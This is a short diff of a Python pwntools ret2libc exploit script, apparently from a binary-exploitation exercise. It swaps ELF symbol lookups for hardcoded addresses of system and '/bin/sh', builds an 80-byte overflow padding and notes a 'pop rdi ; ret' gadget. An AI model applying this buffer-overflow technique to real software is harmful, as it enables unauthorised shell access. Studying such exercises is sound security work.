@@ -1,9 +1,8 @@
 #!/usr/bin/python
 from pwn import *
 
-e = ELF("./ret2libc")
-system_address = e.symbols["system"]
-bin_sh_address = e.search("/bin/sh").next()
+system_address = 0x40f680
+bin_sh_address = 0x4a2168
 
 payload = 'A' * 80
 # 0x0000000000401526 : pop rdi ; ret
